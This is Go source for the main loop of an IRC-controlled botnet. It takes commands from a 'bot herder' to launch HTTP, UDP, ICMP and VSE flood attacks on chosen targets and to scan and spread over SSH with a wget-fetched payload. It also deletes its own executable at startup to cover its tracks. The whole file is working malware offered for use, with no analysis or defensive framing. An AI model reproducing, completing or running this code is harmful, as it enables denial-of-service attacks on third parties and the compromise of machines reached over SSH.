package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/pkg"
)

const (
	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
	IRC_Backup_Server = "" //config like main server.
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	New_Payload_Name  = "" //config new payload name. //For wget process.
)

func bot(server string) error {
	irc := pkg.IRC_Conn(server)
	tp := textproto.NewReader(bufio.NewReader(irc))

	setup := &pkg.IRC{
		Report:  irc,
		Channel: IRC_Channel,
		ChanKey: IRC_Chan_Password,
	}

	setup.IRC_Login()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}

		//Server interact
		go func() {
			if pkg.IRC_Find(ircRead, "PING :") {
				setup.IRC_Send("PONG " + pkg.IRC_Recv(ircRead, 1))
			}
		}()

		//Check is user modes and Join IRC channel
		if pkg.IRC_Find(ircRead, "+iwx") || pkg.IRC_Find(ircRead, "+i") ||
			pkg.IRC_Find(ircRead, "+w") || pkg.IRC_Find(ircRead, "+x") {
			setup.IRC_Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
		}

		//Check bot herder commands
		go func() {
			switch {
			case pkg.IRC_Find(ircRead, "?get"):
				pkg.DDoS_Switch = false
				setup.IRC_Report("START HTTP GET FLOOD TO: " +
					pkg.IRC_Recv(ircRead, 4))
				setup.GET(pkg.IRC_Recv(ircRead, 4))
			case pkg.IRC_Find(ircRead, "?post"):
				pkg.DDoS_Switch = false
				setup.IRC_Report("START HTTP POST FLOOD TO: " +
					pkg.IRC_Recv(ircRead, 4))
				setup.POST(pkg.IRC_Recv(ircRead, 4))
			case pkg.IRC_Find(ircRead, "?udp"):
				pkg.DDoS_Switch = false
				setup.IRC_Report("START UDP FLOOD TO: " +
					pkg.IRC_Recv(ircRead, 4))
				setup.DUDP(pkg.IRC_Recv(ircRead, 4), pkg.IRC_Recv(ircRead, 5))
			case pkg.IRC_Find(ircRead, "?icmp"):
				pkg.DDoS_Switch = false
				setup.IRC_Report("START ICMP FLOOD TO: " +
					pkg.IRC_Recv(ircRead, 4))
				setup.ICMP(pkg.IRC_Recv(ircRead, 4))
			case pkg.IRC_Find(ircRead, "?vse"):
				pkg.DDoS_Switch = false
				setup.IRC_Report("START VSE FLOOD TO: " +
					pkg.IRC_Recv(ircRead, 4))
				setup.VSE(pkg.IRC_Recv(ircRead, 4))
			case pkg.IRC_Find(ircRead, "?scan"):
				setup.IRC_Report("START SCANNING.")
				setup.SSH_Conn(pkg.IRC_Recv(ircRead, 4), New_Payload_Name)
			case pkg.IRC_Find(ircRead, "?info"):
				setup.ReportInf()
			case pkg.IRC_Find(ircRead, "?kill"):
				os.Exit(0)
			case pkg.IRC_Find(ircRead, "?stopddos"):
				pkg.DDoS_Switch = true
				setup.IRC_Report("STOP ATTACKING.")
			case pkg.IRC_Find(ircRead, "?stopscan"):
				pkg.Scan_Switch = true
				setup.IRC_Report("STOP SCANNING.")
			}
		}()
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		os.Exit(0)
	}

	if bot(IRC_Server) != nil {
		for {
			if bot(IRC_Backup_Server) != nil {
				continue
			} else {
				break
			}
		}
	}
}
